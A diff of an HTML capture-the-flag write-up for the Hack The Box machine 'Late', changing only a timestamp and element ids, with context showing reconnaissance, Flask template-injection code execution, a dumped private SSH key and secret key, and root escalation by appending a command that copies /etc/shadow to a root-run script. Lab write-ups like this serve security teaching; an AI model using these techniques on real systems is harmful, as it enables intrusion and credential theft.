@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-07-31 Sun 00:56 -->
+<!-- 2022-10-31 Mon 22:34 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>HTB | Late</title>
@@ -96,7 +96,7 @@ After enumerating the machine I found a script that activates on ssh connections
 For recon I started with <code>nmap</code> to get a basic understanding of the machine.<br>
 I started with scanning ALL the ports, so that I didn't miss anything that might be hiding outside the standard range.<br>
 </p>
-<pre class="example" id="org86ffe8f">
+<pre class="example" id="org2e9c336">
 # Nmap 7.92 scan initiated Wed Apr 27 21:06:54 2022 as: nmap -p- -oA nmap/all_ports -v 10.129.227.134
 Nmap scan report for 10.129.227.134
 Host is up (0.23s latency).
@@ -112,7 +112,7 @@ Read data files from: /nix/store/n5l0kx2fwaf2fp32a6xmk6hqx7vagimc-nmap-7.92/bin/
 From this I found an open <code>ssh</code> port on 22, and a webserver on port 80.<br>
 So I ran a version scan coupled with a default script scan on the two found ports.<br>
 </p>
-<pre class="example" id="orgd70108a">
+<pre class="example" id="org4e83fb5">
 # Nmap 7.92 scan initiated Wed Apr 27 21:55:20 2022 as: nmap -sC -sV -p 22,80 -oA nmap/script_version_scan 10.129.227.134
 Nmap scan report for 10.129.227.134
 Host is up (0.11s latency).
@@ -169,7 +169,7 @@ This page was quite interesting, as it scans images for text using some kind of 
 <p>
 I uploaded the above picture to see what the output from the server was:<br>
 </p>
-<pre class="example" id="org36b50d2">
+<pre class="example" id="org3b3a736">
 [c3lphie@laptop:~/hacking/ctf/hackthebox/machines/late]$ cat results.txt &lt;p&gt;Convert image
 to TEX Ere Flask
 
@@ -207,7 +207,7 @@ The above snippet created this picture:<br>
 <p>
 Which returned the following result after uploading it to the server:<br>
 </p>
-<pre class="example" id="orgb095463">
+<pre class="example" id="org1f0c759">
 [nix-shell:~/hacking/ctf/hackthebox/machines/late]$ cat result_ssti_proof.txt
 &lt;p&gt;49
 &lt;/p&gt;
@@ -244,7 +244,7 @@ Instead of creating a real subdomain that points to a different IP address.<br>
 For the enumeration of the virtual hosts I used <code>subdomains-top1million-5000.txt</code> from SecLists.<br>
 Which only found got one hit:<br>
 </p>
-<pre class="example" id="org657e6d5">
+<pre class="example" id="orgc933ef6">
 Found: images.late.htb (Status: 200) [Size: 2187]
 </pre>
 </div>
@@ -257,7 +257,7 @@ Found: images.late.htb (Status: 200) [Size: 2187]
 For the directories I used <code>raft-small-words.txt</code>, with <code>html</code> and <code>php</code> as extensions, again from SecLists.<br>
 Which found the following files and directories:<br>
 </p>
-<pre class="example" id="orgebcea9d">
+<pre class="example" id="org329aeaa">
 /index.html           (Status: 200) [Size: 9461]
 /contact.html         (Status: 200) [Size: 6364]
 /assets               (Status: 301) [Size: 194] [--&gt; http://10.129.227.134/assets/]
@@ -267,7 +267,7 @@ Which found the following files and directories:<br>
 <p>
 I also ran <code>gobuster</code> on the subdomain found during the virtual host scan:<br>
 </p>
-<pre class="example" id="org9cc5c43">
+<pre class="example" id="orgf78aa18">
 /scanner              (Status: 500) [Size: 290]
 </pre>
 
@@ -294,7 +294,7 @@ The first thing you usually look at after confirming SSTI is the config object f
 <p>
 The above picture returned a file with the following text:<br>
 </p>
-<pre class="example" id="orgdd35143">
+<pre class="example" id="orgcf82fe6">
 [nix-shell:~/hacking/ctf/hackthebox/machines/late]$ cat result_config.txt
 &lt;p&gt;&amp;lt;Config {&amp;#39;ENV&amp;#39;: &amp;#39;production&amp;#39;, &amp;#39;DEBUG&amp;#39;: False, &amp;#39;TESTING&amp;#39;: False, &amp;#39;PROPAGATE_EXCEPTIONS&amp;#39;: None, &amp;#39;PRESERVE_CONTEXT_ON_EXCEPTION&amp;#39;: None, &amp;#39;SECRET_KEY&amp;#39;: b&amp;#39;_5#y2L&amp;#34;F4Q8z\n\xec]/&amp;#39;, &amp;#39;PERMANENT_SESSION_LIFETIME&amp;#39;: datetime.timedelta(31), &amp;#39;USE_X_SENDFILE&amp;#39;: False, &amp;#39;SERVER_NAME&amp;#39;: None, &amp;#39;APPLICATION_ROOT&amp;#39;: &amp;#39;/&amp;#39;, &amp;#39;SESSION_COOKIE_NAME&amp;#39;: &amp;#39;session&amp;#39;, &amp;#39;SESSION_COOKIE_DOMAIN&amp;#39;: False, &amp;#39;SESSION_COOKIE_PATH&amp;#39;: None, &amp;#39;SESSION_COOKIE_HTTPONLY&amp;#39;: True, &amp;#39;SESSION_COOKIE_SECURE&amp;#39;: False, &amp;#39;SESSION_COOKIE_SAMESITE&amp;#39;: None, &amp;#39;SESSION_REFRESH_EACH_REQUEST&amp;#39;: True, &amp;#39;MAX_CONTENT_LENGTH&amp;#39;: None, &amp;#39;SEND_FILE_MAX_AGE_DEFAULT&amp;#39;: None, &amp;#39;TRAP_BAD_REQUEST_ERRORS&amp;#39;: None, &amp;#39;TRAP_HTTP_EXCEPTIONS&amp;#39;: False, &amp;#39;EXPLAIN_TEMPLATE_LOADING&amp;#39;: False, &amp;#39;PREFERRED_URL_SCHEME&amp;#39;: &amp;#39;http&amp;#39;, &amp;#39;JSON_AS_ASCII&amp;#39;: True, &amp;#39;JSON_SORT_KEYS&amp;#39;: True, &amp;#39;JSONIFY_PRETTYPRINT_REGULAR&amp;#39;: False, &amp;#39;JSONIFY_MIMETYPE&amp;#39;: &amp;#39;application/json&amp;#39;, &amp;#39;TEMPLATES_AUTO_RELOAD&amp;#39;: None, &amp;#39;MAX_COOKIE_SIZE&amp;#39;: 4093}&amp;gt;
 &lt;/p&gt;
@@ -303,7 +303,7 @@ The above picture returned a file with the following text:<br>
 There is a lot of garbage in that called html entities normally used to prevent Cross Site Scripting attacks.<br>
 After cleaning it up using we get the following:<br>
 </p>
-<pre class="example" id="org2265baf">
+<pre class="example" id="orga2395e3">
 Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': b'_5#y2L"F4Q8z\n\xec]/', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}
 </pre>
 <p>
@@ -320,7 +320,7 @@ But since I essentially have Remote Code Execution on the server, I can run comm
 <p>
 Which resulted in this:<br>
 </p>
-<pre class="example" id="orgf9a6bc0">
+<pre class="example" id="org38d46c8">
 [c3lphie@laptop:~/hacking/ctf/hackthebox/machines/late]$ cat result_rce_whoami.txt
 &lt;p&gt;b&amp;#39;svc_acc&amp;#39;
 &lt;/p&gt;
@@ -375,7 +375,7 @@ Which is a sorta-kinda stable pseudo shell, atleast more stable than sitting and
 <p>
 I then started enumerating the server, and found this inside the <code>.ssh</code> folder:<br>
 </p>
-<pre class="example" id="orgc996f7b">
+<pre class="example" id="orgbcb4548">
 [nix-shell:~/hacking/ctf/hackthebox/machines/late]$ python create_img.py "ls ../.ssh"
 &lt;p&gt;
 authorized_keys
@@ -387,7 +387,7 @@ id_rsa.pub
 <p>
 I then read the private key, pasted below, so that I could log in as <code>svc_acc</code>.<br>
 </p>
-<pre class="example" id="org926356f">
+<pre class="example" id="orge8e4c21">
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
 HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
@@ -419,7 +419,7 @@ kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
 <p>
 I threw that into a file called <code>svc_rsa</code> and set the correct permissions before connecting using <code>ssh</code>:<br>
 </p>
-<pre class="example" id="orgac26447">
+<pre class="example" id="org3141345">
 [c3lphie@laptop:~/hacking/ctf/hackthebox/machines/late]$ ssh -i svc_rsa svc_acc@late
 svc_acc@late:~$ ls
 app  user.txt
@@ -441,7 +441,7 @@ I uploaded <code>linpeas.sh</code> to the server using <code>scp</code>, to spee
 <p>
 <code>linpeas.sh</code> found this file in our path, which I (svc<sub>acc</sub>) owned.<br>
 </p>
-<pre class="example" id="org0712f2e">
+<pre class="example" id="org2e0f2c5">
 ╔══════════╣ .sh files in path
 ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
 You own the script: /usr/local/sbin/ssh-alert.sh
@@ -450,7 +450,7 @@ You own the script: /usr/local/sbin/ssh-alert.sh
 <p>
 The script has the following content:<br>
 </p>
-<pre class="example" id="org6126c6e">
+<pre class="example" id="org537b33c">
 svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh
 #!/bin/bash
 
@@ -477,7 +477,7 @@ fi
 <p>
 The name and content of the script hints at what it does, but to find how it is executed I used a recursive <code>grep</code> call:<br>
 </p>
-<pre class="example" id="orgd964480">
+<pre class="example" id="org95d3b32">
 svc_acc@late:~$ grep -r ssh-alert / 2&gt;/dev/null
 /etc/pam.d/sshd:session required pam_exec.so /usr/local/sbin/ssh-alert.sh
 ^C
@@ -493,7 +493,7 @@ The script I can change using <code>vim</code> or some other text editor&#x2026;
 <p>
 It is protected by extended attributes, which we can check using <code>getfacl</code>:<br>
 </p>
-<pre class="example" id="org69591e3">
+<pre class="example" id="org7917d72">
 svc_acc@late:/usr/local/sbin$ getfacl ssh-alert.sh
 # file: ssh-alert.sh
 # owner: svc_acc
@@ -515,7 +515,7 @@ Due this not being handled in the file access control list (fACL) for the file, 
 <p>
 I tested this by appending a copy of the content of the <code>/etc/shadow</code> file, to see if I could read it:<br>
 </p>
-<pre class="example" id="org580089e">
+<pre class="example" id="org402c179">
 svc_acc@late:/usr/local/sbin$ echo 'cat /etc/shadow &gt; /dev/shm/shadow_copy' &gt;&gt; ssh-alert.sh
 svc_acc@late:/usr/local/sbin$
 </pre>
@@ -523,7 +523,7 @@ svc_acc@late:/usr/local/sbin$
 <p>
 And then just log in with a new <code>ssh</code> session to execute the script:<br>
 </p>
-<pre class="example" id="org82634ae">
+<pre class="example" id="org47d74c5">
 [c3lphie@laptop:~/hacking/ctf/hackthebox/machines/late]$ ssh -i svc_rsa svc_acc@late.htb
 svc_acc@late:~$ ls /dev/shm/
 shadow_copy
@@ -578,7 +578,7 @@ I think it might be because of some firewall rules that might be acting weird on
 <p>
 Anyway I just read the content of the root flag using the same method as the shadow file:<br>
 </p>
-<pre class="example" id="org2e652ce">
+<pre class="example" id="org0e9d210">
 [c3lphie@laptop:~/hacking/ctf/hackthebox/machines/late]$ ssh -i svc_rsa svc_acc@late.htb
 svc_acc@late:~$ ls /dev/shm/
 root.txt     shadow_copy
